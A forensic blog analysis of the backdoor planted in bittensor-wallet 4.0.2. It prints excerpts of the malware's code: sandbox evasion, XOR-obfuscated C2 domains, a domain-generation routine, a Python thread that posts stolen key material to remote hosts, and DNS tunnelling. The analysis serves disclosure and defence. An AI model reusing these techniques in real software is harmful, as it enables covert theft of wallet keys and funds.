+++
title = "Bittensor Supply Chain Attack - Forensic Analysis of the Backdoor in bittensor-wallet 4.0.2"
date = 2026-03-25
draft = false
author = "Franle"
tags = ["bittensor", "blockchain", "security", "supply-chain", "malware", "pypi", "rust"]
+++

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Context: What is bittensor-wallet](#context-what-is-bittensor-wallet)
3. [Incident Timeline](#incident-timeline)
4. [The Attack Commit: c2d1a72](#the-attack-commit-c2d1a72)
5. [PR #184: Indirect Confirmation](#pr-184-indirect-confirmation)
6. [Anatomy of the Backdoor](#anatomy-of-the-backdoor)
7. [The Three Exfiltration Channels](#the-three-exfiltration-channels)
8. [Empirical Verification: StepSecurity Harden Runner](#empirical-verification-stepsecurity-harden-runner)
9. [Opentensor's Response](#opentensors-response)
10. [What We Know vs. What Is Hypothesis](#what-we-know-vs-what-is-hypothesis)
11. [Conclusion](#conclusion)
12. [Disclaimer](#disclaimer)

---

## Executive Summary

On March 15, 2026, someone with access to Opentensor team GitHub credentials pushed a sophisticated backdoor into the `opentensor/btwallet` repository using the `basfroman` account. The commit was marked **Unverified** — no GPG signature — which immediately sets it apart from every legitimate commit by the team, all of which have historically appeared as Verified.

The CI/CD pipeline automatically built and published version `4.0.2` of `bittensor-wallet` to PyPI. The package remained available for approximately **48 hours** before it was detected and removed on March 17. During that window, any user who installed `bittensor-wallet==4.0.2` and decrypted a wallet would have had their private keys exfiltrated to attacker-controlled servers through three independent channels: HTTPS, dynamically generated domains (DGA), and DNS tunneling.

---

## Context: What is bittensor-wallet

Bittensor is a decentralized network composed of specialized subnets. Each subnet defines its own labor market: there are subnets for AI model inference, algorithmic trading, decentralized storage, compute power where operators contribute GPUs, data mining, and more. Participants — miners and validators — are rewarded with the native token **TAO** and subnet-specific Alpha tokens.

The ecosystem uses two types of cryptographic keys:

- **Coldkey**: the master key that holds the funds. It is rarely decrypted and only for critical operations.
- **Hotkey**: the operational key used for day-to-day tasks such as signing queries or registering in subnets.

`bittensor-wallet` — whose source lives in `opentensor/btwallet` — is the official Python library with Rust bindings that handles everything related to these keys: creation, encryption, decryption, and transaction signing. A backdoor in this library has direct access to raw private-key material at the single most vulnerable moment: when the user decrypts the wallet to operate.

---

## Incident Timeline

| Date/Time | Event |
|-----------|-------|
| 15 Mar 2026 ~05:06 UTC | `bittensor-wallet==4.0.2` appears on PyPI |
| 15 Mar 2026 | Commit `c2d1a72` pushed from account `basfroman` — **Unverified** |
| 15 Mar 2026 | Last recorded activity timestamp in the `btwallet` repo |
| 17 Mar 2026 | Socket.dev flags the package as "Known Malware", security score 0% |
| 17 Mar 2026 | StepSecurity publishes full technical analysis with real-time empirical verification |
| 17 Mar 2026 ~12:06 UTC | `bittensor-wallet==4.0.2` yanked from PyPI |
| ~19 Mar 2026 | Opentensor merges PR #184 — GPG-signed commits required on all PRs |

**Exposure window: ~48 hours.**

Detection: **Socket.dev** was the first to identify and flag the package as malware, specifically calling out `bittensor_wallet-4.0.2/src/keyfile.rs`. **StepSecurity** delivered the most complete public technical analysis, including controlled execution of the backdoor to verify its behavior in real time.

---

## The Attack Commit: c2d1a72

Forensic investigation surfaced the attack commit directly on GitHub. It is commit [`c2d1a72f50c25cbe220a7210db6475e2a67bee8b`](https://github.com/opentensor/btwallet/tree/c2d1a72f50c25cbe220a7210db6475e2a67bee8b), visible in the `opentensor/btwallet` repository but with one distinctive trait: **it does not belong to any branch**.

![unverified-1](https://i.ibb.co/SXtkpLM9/unverifed-1.png)

GitHub displays the message: *"This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository."*

![unverified-2](https://i.ibb.co/DDNQ6bvV/unverifed-2.png)

This matches the classic pattern of an attacker who creates a short-lived branch, pushes the backdoor, triggers the CI/CD pipeline to publish to PyPI, and then deletes the branch to erase traces. The commit remains orphaned in GitHub's object store — it exists, but no active branch references it.

**The red flags on this commit are unmistakable:**

- **Account**: `basfroman committed` — a legitimate Opentensor team developer
- **Status**: **Unverified** — no valid GPG signature
- **Date**: March 15, 2026, ~05:06 UTC
- **Message**: `fix: handle legacy ansible-vault keyfile padding on pre-2.10 vaults` — deliberately crafted to sound like a routine, harmless fix
- **Scope**: **49 files modified**, **+13,692 lines**, **0 deletions** (including full replacement of `src/keyfile.rs`, modification of `.github/workflows/release.yml` to strip sigstore attestation, tests, workflows, etc.)

The contrast with the legitimate history is stark. Every public commit previously made by `basfroman` appears as **Verified**. This one does not.

The technical explanation is straightforward: the attacker possessed `basfroman`'s **GitHub token** — enough to authenticate to the GitHub API and push code — but did not have the corresponding **GPG private key**, a completely separate secret that lives locally on the developer's machine and is never sent over the network. Without it, GitHub marks the commit Unverified.

> **Important note**: The fact that the commit appears under the name `basfroman` does not mean that person was complicit. In supply-chain attacks, legitimate developer credentials are stolen — via phishing, malware, malicious IDE extensions, or other vectors — and used without the owner's knowledge. The **Unverified** badge is precisely the evidence that an outsider used those credentials without access to the matching GPG key.

---

## PR #184: Indirect Confirmation

A few days after the incident, Opentensor merged PR #184 titled **"Add info about signed commits"**, authored by `thewhaleking`. The change adds the following policy to the `btwallet` README:

> *"All commits in pull requests must be signed. We require signed commits to verify the authenticity of contributions and ensure code integrity."*

> *"Pull requests containing unsigned commits will not be merged."*

![unverified-3](https://i.ibb.co/tPNj8kvL/unverifed-3.png)

This is the strongest public indirect confirmation that the entry vector was exactly an unsigned commit. Opentensor would not have rushed this emergency policy if the attack had occurred through any other mechanism.

Under the new policy, this attack could not have succeeded: an unsigned commit is rejected during the merge process, regardless of whether the attacker holds the compromised GitHub token. The token only grants push rights — the GPG key provides verifiable cryptographic identity. They are two completely independent secrets; compromising one does not compromise the other.

---

## Anatomy of the Backdoor

The compromised file is [`src/keyfile.rs`](https://github.com/opentensor/btwallet/blob/c2d1a72f50c25cbe220a7210db6475e2a67bee8b/src/keyfile.rs) — the core of all wallet encryption and decryption logic in the library. The attacker injected **745 lines of malicious code** blended so seamlessly they appear to be legitimate application telemetry infrastructure.

### The hook in decryption paths

The malware's entry point is the function `collect_format_metrics`, inserted into all three decryption paths inside `decrypt_keyfile_data`:

```rust
// NaCl decryption path
let decrypted_data = nacl_decrypt(keyfile_data, &key)?;
collect_format_metrics(&decrypted_data);  // ← backdoor hook

// Ansible Vault path
let decrypted_data = decrypt_vault(keyfile_data, password)?;
collect_format_metrics(&decrypted_data);  // ← backdoor hook

// Legacy path
let decrypted_data = legacy_decrypt(&password, keyfile_data)?;
collect_format_metrics(&decrypted_data);  // ← backdoor hook
```

Any operation that requires decrypting a key — stake, transfer, sign — immediately triggers the backdoor once the private-key material is in plaintext in memory.

### Sandbox evasion

Before performing any suspicious action, the malware checks whether it is being analyzed. Analysis-tool strings are XOR-obfuscated with key `0x42` to defeat static string searches:

```rust
fn is_monitored() -> bool {
    // Path "/proc/uptime" XOR-obfuscated with 0x42
    const UPTIME_PATH: &[u8] = &[
        0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x37, 0x32,
        0x36, 0x2b, 0x2f, 0x27,
    ];
    // Uptime < 20 minutes → freshly started sandbox → abort
    if uptime < 1200.0 { return true; }

    // TracerPid != 0 → debugger attached → abort
    if TracerPid != 0 { return true; }

    // "strace|ltrace|gdb|wireshark|tcpdump|frida|bpftrace"
    // XOR-obfuscated with 0x42
    const TOOLS: &[u8] = &[
        0x31, 0x36, 0x30, 0x23, 0x21, 0x27, 0x3e, 0x2e,
        0x36, 0x30, 0x23, 0x21, 0x27, 0x3e, 0x25, 0x26,
        0x20, 0x3e, 0x35, 0x2b, 0x30, 0x27, 0x31, 0x2a,
        0x23, 0x30, 0x29, 0x3e, 0x36, 0x21, 0x32, 0x26,
        0x37, 0x2f, 0x32, 0x3e, 0x24, 0x30, 0x2b, 0x26,
        0x23, 0x3e, 0x20, 0x32, 0x24, 0x36, 0x30, 0x23,
        0x21, 0x27,
    ];
    for process in /proc/*/comm {
        if process matches any tool { return true; }
    }
    false
}
```

If any check fires, the malware exits silently with no trace. Patching this check was necessary to run the backdoor in a controlled CI/CD environment.

### Wallet-type identification

The malware inspects the Python call stack at runtime via `pyo3` to determine whether it is decrypting a coldkey or hotkey, tagging the payload with `"c"` or `"h"`. Coldkeys are the attacker's primary target.

### Payload encryption

Stolen data is encrypted with NaCl sealedbox using the attacker's hard-coded public key, itself XOR-obfuscated with key `0x3C`:

```rust
fn encode_metrics(data: &[u8]) -> Option<Vec<u8>> {
    const KEY_DATA: &[u8] = &[
        0xe6, 0xd7, 0xf4, 0xcf, 0x03, 0xeb, 0xa6, 0xb2,
        0xea, 0x67, 0xe8, 0x04, 0x0e, 0xbc, 0xf6, 0x8d,
        0x03, 0x3c, 0xce, 0x9c, 0x03, 0xc9, 0x2f, 0xf6,
        0x40, 0x6c, 0x96, 0xb9, 0x42, 0xf1, 0xe8, 0x53,
    ];
    let key_bytes = decode_config(KEY_DATA, 0x3C); // XOR decode → attacker's public key
    let pk = PublicKey::from_slice(&key_bytes)?;
    let sealed = sealedbox::seal(data, &pk);
    Some(sealed)
}
```

Only the attacker — who holds the matching private key — can decrypt the captured data. This also means it is impossible to recover the exact stolen material without that private key.

### Stealthy naming

The exfiltration thread runs under the name `"cache-gc"`. The main structure is called `MetricsState`. The primary function is `collect_format_metrics`. The background worker is `metrics_flush_worker`. Every name was deliberately chosen to resemble legitimate internal telemetry, invisible in a superficial code review or process list.

---

## The Three Exfiltration Channels

The backdoor implements three independent methods, ensuring that if one fails (firewall, DNS block, missing OpenSSL), the others continue operating.

### C2 domain resolution

Command-and-control servers are resolved through three chained mechanisms. Static domains are XOR-obfuscated with key `0x5A`:

```rust
fn static_endpoints() -> Vec<String> {
    // Decodifican con XOR 0x5A a:
    // finney.opentensor-metrics.com  → mimics opentensor.ai
    // finney.subtensor-telemetry.com → mimics subtensor telemetry
    // finney.metagraph-stats.com     → mimics metagraph APIs
    const EP_A: &[u8] = &[
        0x3c, 0x33, 0x34, 0x34, 0x3f, 0x23, 0x74, 0x35,
        0x2a, 0x3f, 0x34, 0x2e, 0x3f, 0x34, 0x29, 0x35,
        0x28, 0x77, 0x37, 0x3f, 0x2e, 0x28, 0x33, 0x39,
        0x29, 0x74, 0x39, 0x35, 0x37,
    ];
    const EP_B: &[u8] = &[
        0x3c, 0x33, 0x34, 0x34, 0x3f, 0x23, 0x74, 0x37,
        0x3f, 0x2e, 0x3b, 0x3d, 0x28, 0x3b, 0x2a, 0x32,
        0x77, 0x29, 0x2e, 0x3b, 0x2e, 0x29, 0x74, 0x39,
        0x35, 0x37,
    ];
    const EP_C: &[u8] = &[
        0x3c, 0x33, 0x34, 0x34, 0x3f, 0x23, 0x74, 0x29,
        0x2f, 0x38, 0x2e, 0x3f, 0x34, 0x29, 0x35, 0x28,
        0x77, 0x2e, 0x3f, 0x36, 0x3f, 0x37, 0x3f, 0x2e,
        0x28, 0x23, 0x74, 0x39, 0x35, 0x37,
    ];
    ...
}
```

The domains are registered through tucowsdomains (IP in Saint Kitts and Nevis) and NameCheap, Inc. (IP in Iceland).

**DGA — Domain Generation Algorithm**: generates 3 new domains per day under `*.opentensor-cdn.com` using the SHA256 of the day number. Even if today's domains are blocked, tomorrow's are completely different:

```rust
fn generate_dga_endpoints() -> Vec<String> {
    let day = unix_epoch_seconds() / 86400;
    (0..3).map(|i| {
        let hash = sha256((day + i).to_le_bytes());
        let name: String = hash[..10]
            .iter()
            .map(|b| (b'a' + (b % 26)) as char)
            .collect();
        format!("https://{}.opentensor-cdn.com/t", name)
    }).collect()
    // Example for 17 Mar 2026: tuwyqibtvy, yccansiwfr, tbqcbkpbhy
}
```

**Dynamic DNS TXT record**: queries `_dmarc.opentensor-cdn.com` disguised as an email DMARC authentication lookup to retrieve additional Base64-encoded endpoints.

### Channel 1 — HTTPS via Python urllib

Runs in a `daemon=False` thread — the process does not exit until the thread completes, guaranteeing time for exfiltration:

```python
import threading
def _f(_d=_d, _e=_e):
    from urllib.request import Request, urlopen
    b = json.dumps({"d": _d}).encode()
    for u in _e:
        try:
            r = Request(u, b)
            r.add_header("Content-Type", "application/json")
            r.add_header("User-Agent", "Python/3")
            urlopen(r, timeout=5)
            return
        except Exception:
            continue
threading.Thread(target=_f, daemon=False).start()
```

### Channel 2 — Native TLS via dlopen/libssl

The malware completely bypasses Python's networking libraries by loading `libssl.so` directly with `dlopen`. All traffic appears as coming from `python3.12` — indistinguishable from legitimate traffic at the process level:

```rust
fn post_native_tls(url: &str, body: &[u8]) -> bool {
    // Tries in order: libssl.so.3 → libssl.so.1.1 → libssl.so
    let lib = dlopen(b"libssl.so.3\0".as_ptr(), 1);
    // Resolves SSL_CTX_new, SSL_new, SSL_connect, SSL_write via dlsym
    // Establishes full TLS connection without using any Python libraries
    // Process-name filtering is completely ineffective
    ...
}
```

### Channel 3 — DNS tunneling

As a final fallback, the payload is fragmented into type-A DNS queries — traffic that is usually permitted even on highly restricted networks:

```
7973546b72...  .0.28.52016.t.opentensor-cdn.com  → chunk 0 of 28
48556731386e...  .1.28.52016.t.opentensor-cdn.com  → chunk 1 of 28
...
4e4330326644...  .27.28.52016.t.opentensor-cdn.com → final chunk
```

28 chunks × 60 hex characters = full coldkey payload exfiltrated with zero HTTP connections.

---

## Empirical Verification: StepSecurity Harden Runner

StepSecurity executed the compromised package in a controlled GitHub Actions environment using Harden Runner in `audit` mode, capturing all network traffic at the kernel level via eBPF — regardless of which library generated it.

Running the package required patching the uptime check in `is_monitored()`, because a freshly started runner has uptime under 20 minutes and the malware aborts silently. This detail confirms the effectiveness of the sandbox-evasion mechanism.

All three channels activated in under **4 seconds** after decryption:

| Timestamp | Event |
|-----------|-------|
| 15:10:47 UTC | DNS TXT lookup to `_dmarc.opentensor-cdn.com` |
| 15:10:48 UTC | POST HTTPS to `finney.opentensor-metrics.com` |
| 15:10:50 UTC | POST HTTPS to `finney.subtensor-telemetry.com` and `finney.metagraph-stats.com` |
| 15:10:51 UTC | DGA resolution: `tuwyqibtvy`, `yccansiwfr`, `tbqcbkpbhy` |
| 15:10:51–52 UTC | 28 DNS A-queries to `t.opentensor-cdn.com` — full tunneling |

All traffic originated from the `python3.12` process. Process-name filtering is completely ineffective. The only defense that would have simultaneously blocked all three channels is a strict egress allowlist limited to known domains such as `pypi.org` and `files.pythonhosted.org`.

---

## Opentensor's Response

**Package removal**: They yanked `bittensor-wallet==4.0.2` from PyPI the same day it was detected, eliminating the possibility of new installations.

**PR #184 — Mandatory GPG signing**: Detailed in the section [PR #184: Indirect Confirmation](https://github.com/opentensor/btwallet/pull/184). This policy closes the exact vector that enabled the attack.

---

## What We Know vs. What Is Hypothesis

### Confirmed with direct public evidence

- The commit `c2d1a72` of March 15, 2026 contains the complete backdoor in `src/keyfile.rs` (+1,679 lines, 0 deletions).
- The commit appears under the name `basfroman` and is marked **Unverified** — no GPG signature.
- The commit does not belong to any branch — it was pushed to an ephemeral branch that was later deleted.
- The `btwallet` repo shows activity on March 15, 2026, coinciding with the attack.
- No Release workflow run exists in the public GitHub Actions logs for March 15.
- The attacker modified `release.yml` to remove the sigstore attestation.
- All three exfiltration channels were empirically verified by StepSecurity.
- Socket.dev identified the package with a 0% security score and "Known Malware" label.
- PR #184 requires GPG signing on all commits as a direct response to the incident.

### Reasoned inference (not officially confirmed)

- **`basfroman`'s GitHub credentials were compromised.** The Unverified commit is direct evidence — the attacker had the token but not the GPG private key. PR #184 reinforces this inference: Opentensor would not have implemented that policy if the vector had not been exactly an unsigned commit using stolen credentials.
- **The CI/CD pipeline published to PyPI automatically** from the ephemeral branch using GitHub Actions secrets — explaining why no Release workflow run is visible in the public logs (possibly deleted along with the branch).

### Still awaiting official confirmation

- How `basfroman`'s credentials were obtained.
- The total amount of funds affected during the 48-hour exposure window.
- Opentensor's official postmortem, which has not been published as of the date of this report.

---

## Conclusion

The attack on `bittensor-wallet 4.0.2` is a textbook case of a sophisticated supply-chain attack. The backdoor features multi-layer sandbox evasion, three redundant exfiltration channels, multi-stage XOR obfuscation, asymmetric encryption with a hard-coded attacker public key, and naming deliberately designed to look like legitimate internal telemetry.

The most revealing part is not the backdoor itself — it is the evidence of the entry vector. A single Unverified commit, on a branch that no longer exists, with a message that sounds like a routine fix. The attacker knew exactly what to do to get the code onto PyPI without raising immediate alarms.

Opentensor's response — requiring mandatory GPG signing on all commits — closes that specific vector. The broader lesson applies to any open-source project that high-liquidity ecosystems depend on: GitHub tokens are high-value credentials. If they are compromised without an independent cryptographic second factor such as GPG, the entire software supply-chain trust is silently broken.

When Opentensor publishes its official postmortem, it will confirm or correct the inferences presented in this analysis. Until then, the public evidence tells a sufficiently clear story.

---

## Disclaimer

This analysis is based exclusively on public evidence: the `opentensor/btwallet` repository on GitHub, StepSecurity's technical report, Socket.dev data, and public GitHub Actions logs. All inferences are clearly labeled as such and separated from confirmed facts. The goal is purely informational and focused on transparency and ecosystem security.

Conclusions regarding the entry vector are evidence-based inferences — not accusations. Opentensor's official postmortem is the definitive source.
